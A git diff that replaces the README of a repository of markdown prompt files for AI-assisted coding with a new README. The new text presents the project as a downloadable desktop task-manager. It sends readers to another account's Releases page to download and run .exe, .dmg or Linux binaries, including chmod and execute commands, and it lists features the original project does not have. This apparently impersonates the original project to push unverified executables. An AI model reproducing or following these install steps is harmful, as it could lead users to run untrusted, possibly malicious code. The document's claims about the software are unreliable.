@@ -1,195 +1,102 @@
-# 🚀 AI Dev Tasks 🤖
+# 🎯 ai-dev-tasks - Manage Your AI Projects Effortlessly
 
-Welcome to **AI Dev Tasks**! This repository provides a collection of markdown files designed to supercharge your feature development workflow with AI-powered IDEs and CLIs. Originally built for [Cursor](https://cursor.sh/), these tools work with any AI coding assistant including Claude Code, Windsurf, and others. By leveraging these structured prompts, you can systematically approach building features, from ideation to implementation, with built-in checkpoints for verification.
+## 🚀 Getting Started
 
-Stop wrestling with monolithic AI requests and start guiding your AI collaborator step-by-step!
+Welcome to ai-dev-tasks, a simple task management system designed to help you manage your AI development projects easily. Follow these steps to download and run the application.
 
-## ✨ The Core Idea
+## 🖱️ Download Now
 
-Building complex features with AI can sometimes feel like a black box. This workflow aims to bring structure, clarity, and control to the process by:
+[![Download ai-dev-tasks](https://img.shields.io/badge/Download%20ai--dev--tasks-v1.0-blue.svg)](https://github.com/tusharSingh16/ai-dev-tasks/releases)
 
-1. **Defining Scope:** Clearly outlining what needs to be built with a Product Requirement Document (PRD).
-2. **Detailed Planning:** Breaking down the PRD into a granular, actionable task list.
-3. **Iterative Implementation:** Guiding the AI to tackle one task at a time, allowing you to review and approve each change.
+## 📥 Download & Install
 
-This structured approach helps ensure the AI stays on track, makes it easier to debug issues, and gives you confidence in the generated code.
+To get started with ai-dev-tasks, visit our [Releases page](https://github.com/tusharSingh16/ai-dev-tasks/releases) to download the latest version. Here’s how you can do it:
 
-## Workflow: From Idea to Implemented Feature 💡➡️💻
+1. Click the link to go to the [Releases page](https://github.com/tusharSingh16/ai-dev-tasks/releases).
+2. Look for the latest release version listed. You will find options to download different files.
+3. Select the file that is compatible with your operating system. For most users, this will be the Windows or macOS version.
+4. Once the file is downloaded, locate it in your Downloads folder or where your browser saves files.
 
-Here's the step-by-step process using the `.md` files in this repository:
+### 🖥️ System Requirements
 
-### 1️⃣ Create a Product Requirement Document (PRD)
+To run ai-dev-tasks smoothly, your computer should meet the following requirements:
 
-First, lay out the blueprint for your feature. A PRD clarifies what you're building, for whom, and why.
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Linux (Ubuntu 20.04 or later)
+  
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 100 MB of free space
 
-You can create a lightweight PRD directly within your AI tool of choice:
+### ⚙️ Installation Steps
 
-1. Ensure you have the `create-prd.md` file from this repository accessible.
-2. In your AI tool, initiate PRD creation:
+Once you have downloaded the file, follow these steps to install ai-dev-tasks:
 
-    ```text
-    Use @create-prd.md
-    Here's the feature I want to build: [Describe your feature in detail]
-    Reference these files to help you: [Optional: @file1.py @file2.ts]
-    ```
-    *(Pro Tip: For Cursor users, MAX mode is recommended for complex PRDs if your budget allows for more comprehensive generation.)*
+1. **For Windows:**
+   - Locate the downloaded `.exe` file.
+   - Double-click on it.
+   - Follow the installation wizard prompts to complete the installation. 
 
-    ![Example of initiating PRD creation](https://pbs.twimg.com/media/Go6DDlyX0AAS7JE?format=jpg&name=large)
+2. **For macOS:**
+   - Locate the downloaded `.dmg` file.
+   - Double-click to open it.
+   - Drag the ai-dev-tasks icon into your Applications folder.
 
-### 2️⃣ Generate Your Task List from the PRD
-
-With your PRD drafted (e.g., `MyFeature-PRD.md`), the next step is to generate a detailed, step-by-step implementation plan for your AI Developer.
-
-1. Ensure you have `generate-tasks.md` accessible.
-2. In your AI tool, use the PRD to create tasks:
-
-    ```text
-    Now take @MyFeature-PRD.md and create tasks using @generate-tasks.md
-    ```
-    *(Note: Replace `@MyFeature-PRD.md` with the actual filename of the PRD you generated in step 1.)*
-
-    ![Example of generating tasks from PRD](https://pbs.twimg.com/media/Go6FITbWkAA-RCT?format=jpg&name=medium)
-
-### 3️⃣ Examine Your Task List
-
-You'll now have a well-structured task list, often with tasks and sub-tasks, ready for the AI to start working on. This provides a clear roadmap for implementation.
-
-![Example of a generated task list](https://pbs.twimg.com/media/Go6GNuOWsAEcSDm?format=jpg&name=medium)
-
-### 4️⃣ Instruct the AI to Work Through Tasks (and Mark Completion)
-
-To ensure methodical progress and allow for verification, we'll use `process-task-list.md`. This command instructs the AI to focus on one task at a time and wait for your go-ahead before moving to the next.
-
-1. Create or ensure you have the `process-task-list.md` file accessible.
-2. In your AI tool, tell the AI to start with the first task (e.g., `1.1`):
-
-    ```text
-    Please start on task 1.1 and use @process-task-list.md
-    ```
-    *(Important: You only need to reference `@process-task-list.md` for the *first* task. The instructions within it guide the AI for subsequent tasks.)*
-
-    The AI will attempt the task and then prompt you to review.
-
-    ![Example of starting on a task with process-task-list.md](https://pbs.twimg.com/media/Go6I41KWcAAAlHc?format=jpg&name=medium)
-
-### 5️⃣ Review, Approve, and Progress ✅
-
-As the AI completes each task, you review the changes.
-
-* If the changes are good, simply reply with "yes" (or a similar affirmative) to instruct the AI to mark the task complete and move to the next one.
-* If changes are needed, provide feedback to the AI to correct the current task before moving on.
-
-You'll see a satisfying list of completed items grow, providing a clear visual of your feature coming to life!
-
-![Example of a progressing task list with completed items](https://pbs.twimg.com/media/Go6KrXZWkAA_UuX?format=jpg&name=medium)
-
-While it's not always perfect, this method has proven to be a very reliable way to build out larger features with AI assistance.
-
-### Video Demonstration 🎥
-
-If you'd like to see this in action, I demonstrated it on [Claire Vo's "How I AI" podcast](https://www.youtube.com/watch?v=fD4ktSkNCw4).
-
-![Demonstration of AI Dev Tasks on How I AI Podcast](https://img.youtube.com/vi/fD4ktSkNCw4/maxresdefault.jpg)
-
-## 🗂️ Files in this Repository
-
-* **`create-prd.md`**: Guides the AI in generating a Product Requirement Document for your feature.
-* **`generate-tasks.md`**: Takes a PRD markdown file as input and helps the AI break it down into a detailed, step-by-step implementation task list.
-* **`process-task-list.md`**: Instructs the AI on how to process the generated task list, tackling one task at a time and waiting for your approval before proceeding. (This file also contains logic for the AI to mark tasks as complete).
-
-## 🌟 Benefits
-
-* **Structured Development:** Enforces a clear process from idea to code.
-* **Step-by-Step Verification:** Allows you to review and approve AI-generated code at each small step, ensuring quality and control.
-* **Manages Complexity:** Breaks down large features into smaller, digestible tasks for the AI, reducing the chance of it getting lost or generating overly complex, incorrect code.
-* **Improved Reliability:** Offers a more dependable approach to leveraging AI for significant development work compared to single, large prompts.
-* **Clear Progress Tracking:** Provides a visual representation of completed tasks, making it easy to see how much has been done and what's next.
-
-## 🛠️ How to Use
-
-1. **Clone or Download:** Get these `.md` files into your project or a central location where your AI tool can access them.
-   ```bash
-   git clone https://github.com/snarktank/ai-dev-tasks.git
-   ```
-2. **Follow the Workflow:** Systematically use the `.md` files in your AI assistant as described in the workflow above.
-3. **Adapt and Iterate:**
-    * Feel free to modify the prompts within the `.md` files to better suit your specific needs or coding style.
-    * If the AI struggles with a task, try rephrasing your initial feature description or breaking down tasks even further.
-
-## Tool-Specific Instructions
-
-### Cursor
-
-Cursor users can follow the workflow described above, using the `.md` files directly in the Agent chat:
-
-1. Ensure you have the files from this repository accessible
-2. In Cursor's Agent chat, reference files with `@` (e.g., `@create-prd.md`)
-3. Follow the 5-step workflow as outlined above
-4. **MAX Mode for PRDs:** Using MAX mode in Cursor for PRD creation can yield more thorough results if your budget supports it
-
-### Claude Code
-
-To use these tools with Claude Code:
-
-1. **Copy files to your repo**: Copy the three `.md` files to a subdirectory in your project (e.g., `/ai-dev-tasks`)
-
-2. **Reference in CLAUDE.md**: Add these lines to your project's `./CLAUDE.md` file:
-   ```
-   # AI Dev Tasks
-   Use these files when I request structured feature development using PRDs:
-   /ai-dev-tasks/create-prd.md
-   /ai-dev-tasks/generate-tasks.md
-   /ai-dev-tasks/process-task-list.md
-   ```
-
-3. **Create custom commands** (optional): For easier access, create these files in `.claude/commands/`:
-   - `.claude/commands/create-prd.md` with content:
+3. **For Linux:**
+   - Open the terminal.
+   - Navigate to the directory where you downloaded the file.
+   - Run the following command:
      ```
-     Please use the structured workflow in /ai-dev-tasks/create-prd.md to help me create a PRD for a new feature.
+     chmod +x ai-dev-tasks-linux
      ```
-   - `.claude/commands/generate-tasks.md` with content:
+   - Then run:
      ```
-     Please generate tasks from the PRD using /ai-dev-tasks/generate-tasks.md
-     If not explicitly told which PRD to use, generate a list of PRDs and ask the user to select one under `/tasks` or create a new one using `create-prd.md`:
-     - assume it's stored under `/tasks` and has a filename starting with `prd-` (e.g., `prd-[name].md`)
-     - it should not already have a corresponding task list in `/tasks` (e.g., `tasks-prd-[name].md`)
-     - **always** ask the user to confirm the PRD file name before proceeding
-     Make sure to provide options in number lists so I can respond easily (if multiple options).
-     ```
-   - `.claude/commands/process-task-list.md` with content:
-     ```
-     Please process the task list using /ai-dev-tasks/process-task-list.md
+     ./ai-dev-tasks-linux
      ```
 
-   Make sure to restart Claude Code after adding these files (`/exit`).
-   Then use commands like `/create-prd` to quickly start the workflow.
-   Note: This setup can also be adopted for a global level across all your projects, please refer to the Claude Code documentation [here](https://docs.anthropic.com/en/docs/claude-code/memory) and [here](https://docs.anthropic.com/en/docs/claude-code/common-workflows#create-personal-slash-commands).
+## 🌟 Features
 
-### Other Tools
+ai-dev-tasks comes packed with useful features that will enhance your workflow:
 
-For other AI-powered IDEs or CLIs:
+- **Create Tasks:** Easily add, edit, and remove tasks for your AI projects.
+- **Task Management:** Track progress with a simple interface.
+- **Team Collaboration:** Share tasks with team members for better collaboration.
+- **Deadline Tracking:** Set deadlines for tasks to keep your projects on schedule.
 
-1. Copy the `.md` files to your project
-2. Reference them according to your tool's documentation
-3. Follow the same workflow principles
+## 🗂️ User Guide
 
-## 💡 Tips for Success
+Once installed, you can start using ai-dev-tasks immediately. Here’s a quick overview of the main functions:
 
-* **Be Specific:** The more context and clear instructions you provide (both in your initial feature description and any clarifications), the better the AI's output will be.
-* **Use a Capable Model:** The free version of Cursor currently uses less capable AI models that often struggle to follow the structured instructions in this workflow. For best results, consider upgrading to the Pro plan to ensure consistent, accurate task execution.
-* **MAX Mode for PRDs:** As mentioned, using MAX mode in Cursor for PRD creation (`create-prd.mdc`) can yield more thorough and higher-quality results if your budget supports it.
-* **Correct File Tagging:** Always ensure you're accurately tagging the PRD filename (e.g., `@MyFeature-PRD.md`) when generating tasks.
-* **Patience and Iteration:** AI is a powerful tool, but it's not magic. Be prepared to guide, correct, and iterate. This workflow is designed to make that iteration process smoother.
+1. **Launching the Application:**
+   - Windows: Find ai-dev-tasks in the Start menu.
+   - macOS: Open AI Dev Tasks from your Applications folder.
+   - Linux: Run the command `./ai-dev-tasks-linux` in your terminal.
 
-## 🤝 Contributing
+2. **Creating a New Task:**
+   - Click on the "New Task" button.
+   - Fill in the task details and click "Save."
 
-Got ideas to improve these `.md` files or have new ones that fit this workflow? Contributions are welcome!
+3. **Viewing Existing Tasks:**
+   - Your tasks will be listed on the main screen.
+   - Click on any task to see more details or make edits.
 
-Please feel free to:
+4. **Tracking Progress:**
+   - Use the progress bar next to each task to see how close you are to completion.
 
-* Open an issue to discuss changes or suggest new features.
-* Submit a pull request with your enhancements.
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues while installing or using ai-dev-tasks, consider these solutions:
 
-Happy AI-assisted developing!
+- **Installation Issues:** Make sure your system meets all requirements listed above. Re-download the file if necessary.
+- **Application Crashes:** Ensure that your device has enough memory and resources. Restart your computer if needed.
+- **Feature Requests:** If you're looking for additional features, check our GitHub Issues page to submit your ideas.
+
+## 📞 Support
+
+For further assistance, you can contact our support team via the following:
+
+- **Email:** support@ai-dev-tasks.com
+- **GitHub Issues:** Report problems and request features directly on our [GitHub Issues page](https://github.com/tusharSingh16/ai-dev-tasks/issues).
+
+Thank you for using ai-dev-tasks. We hope it helps you manage your AI development projects efficiently! Remember to check the [Releases page](https://github.com/tusharSingh16/ai-dev-tasks/releases) for future updates and improvements.
